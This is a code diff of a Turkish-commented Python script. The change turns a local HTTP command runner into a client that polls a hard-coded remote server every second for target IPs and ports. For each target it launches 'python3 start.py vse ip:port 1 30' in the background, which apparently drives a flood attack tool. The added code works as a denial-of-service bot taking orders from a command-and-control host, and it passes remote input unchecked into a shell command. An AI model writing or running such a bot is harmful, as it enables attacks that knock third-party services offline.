@@ -1,88 +1,106 @@
-
-                
- #!/usr/bin/env python3
+import requests
 import subprocess
+import time
+import json
 import os
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
+from threading import Thread
 
-class CommandRunnerHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
+# Konfigürasyon dosyasını yükle
+def load_config():
+    default_config = {
+        "server_url": "http://walzayza.keenetic.pro:8080/",
+        "request_interval": 1,
+        "wait_time": 5,
+        "request_timeout": 3
+    }
+    return default_config
+
+# Konfigürasyonu yükle
+CONFIG = load_config()
+
+def execute_command(ip, port):
+    """Komutu çalıştıran fonksiyon"""
+    try:
+        cmd_string = f"python3 start.py vse {ip}:{port} 1 30"
+        
+        print(f"[*] Komut çalıştırılıyor: {cmd_string}")
+        
+        result = subprocess.run(cmd_string, 
+                              shell=True,
+                              capture_output=True, 
+                              text=True, 
+                              timeout=30)
+        
+        print(f"[+] Komut tamamlandı - IP: {ip}, Port: {port}")
+        
+        if result.stdout:
+            print(f"[+] Çıktı: {result.stdout}")
+        
+        if result.stderr:
+            print(f"[-] Hata: {result.stderr}")
+            
+    except subprocess.TimeoutExpired:
+        print(f"[-] Komut zaman aşımına uğradı - IP: {ip}, Port: {port}")
+    except Exception as e:
+        print(f"[-] Hata oluştu: {str(e)}")
+
+def send_get_request():
+    """Her saniye GET isteği gönderen fonksiyon"""
+    while True:
         try:
-            # URL'den parametreleri al
-            parsed_path = urlparse(self.path)
-            query_params = parse_qs(parsed_path.query)
+            # GET isteği gönder
+            response = requests.get(
+                CONFIG['server_url'], 
+                timeout=CONFIG['request_timeout']
+            )
             
-            # IP ve port parametrelerini al
-            ip = query_params.get('ip', [''])[0]
-            port = query_params.get('port', [''])[0]
-            
-            self.send_response(200)
-            self.send_header('Content-type', 'text/plain; charset=utf-8')
-            self.end_headers()
-            
-            if ip and port:
-                # main.py kontrolü
-                if not os.path.exists('main.py'):
-                    response = "HATA: main.py dosyası bulunamadı!\n"
-                    response += f"Mevcut dizin: {os.getcwd()}\n"
-                    response += f"Dizindeki dosyalar: {os.listdir('.')}"
-                else:
-                    # Komutu basit şekilde çalıştır
-                    cmd_string = f"python3 start.py vse {ip}:{port} 1 30"
+            if response.status_code == 200:
+                try:
+                    # JSON yanıtını parse et
+                    data = response.json()
                     
-                    # Shell=True ile çalıştır
-                    result = subprocess.run(cmd_string, 
-                                          shell=True,
-                                          capture_output=True, 
-                                          text=True, 
-                                          timeout=30)
-                    
-                    response = f"Çalıştırılan komut: {cmd_string}\n"
-                    response += "="*50 + "\n"
-                    
-                    if result.stdout:
-                        response += result.stdout
-                    else:
-                        response += "Çıktı yok\n"
-                    
-                    if result.stderr:
-                        response += f"\nHata çıktısı:\n{result.stderr}"
-                    
-                    response += f"\n\nÇıkış kodu: {result.returncode}"
-            else:
-                response = "HATA: IP ve port parametreleri gerekli!\n"
-                response += "Kullanım: http://localhost:8080?ip=1.1.1.1&port=80"
-            
-            self.wfile.write(response.encode('utf-8'))
-            
-        except Exception as e:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/plain; charset=utf-8')
-            self.end_headers()
-            error_msg = f"Sunucu hatası: {type(e).__name__}: {str(e)}\n"
-            import traceback
-            error_msg += traceback.format_exc()
-            self.wfile.write(error_msg.encode('utf-8'))
-    
-    def log_message(self, format, *args):
-        pass  # Logları gizle
+                    # IP ve port bilgilerini al
+                    if 'ip' in data and 'port' in data:
+                        ip = data['ip']
+                        port = data['port']
+                        
+                        print(f"\n[*] Yeni hedef alındı - IP: {ip}, Port: {port}")
+                        
+                        command_thread = Thread(target=execute_command, args=(ip, port))
+                        command_thread.daemon = True
+                        command_thread.start()
 
-def run_server(port=8080):
-    httpd = HTTPServer(('', port), CommandRunnerHandler)
-    print(f"Sunucu başlatıldı: http://localhost:{port}")
-    print(f"Test: http://localhost:{port}?ip=1.1.1.1&port=80")
-    print(f"Çalışma dizini: {os.getcwd()}")
-    
-    if os.path.exists('main.py'):
-        print("✓ main.py mevcut")
-    else:
-        print("✗ main.py bulunamadı!")
+                        print(f"[*] {CONFIG['wait_time']} saniye bekleniyor...")
+                        time.sleep(CONFIG['wait_time'])
+                        
+                except json.JSONDecodeError:
+                    print("[-] JSON parse hatası")
+                except KeyError:
+                    print("[-] JSON'da ip veya port anahtarı bulunamadı")
+            else:
+                print(f"[-] HTTP {response.status_code} hatası")
+                
+        except requests.exceptions.Timeout:
+            pass  # Sessizce devam et
+        except requests.exceptions.ConnectionError:
+            pass  # Sessizce devam et
+        except Exception as e:
+            print(f"[-] Beklenmeyen hata: {str(e)}")
+        
+        # Belirtilen aralıkta bekle
+        time.sleep(CONFIG['request_interval'])
+
+def main():
+    """Ana fonksiyon"""
+    print("[*] Program başlatılıyor...")
+    print(f"[*] Sunucu URL: {CONFIG['server_url']}")
+    print(f"[*] İstek aralığı: {CONFIG['request_interval']} saniye")
+    print(f"[*] Bekleme süresi: {CONFIG['wait_time']} saniye\n")
     
     try:
-        httpd.serve_forever()
+        send_get_request()
     except KeyboardInterrupt:
-        print("\nSunucu kapatılıyor...")
+        print("\n[!] Program sonlandırılıyor...")
 
-if __name__ == '__main__':
-    run_server()
+if __name__ == "__main__":
+    main()
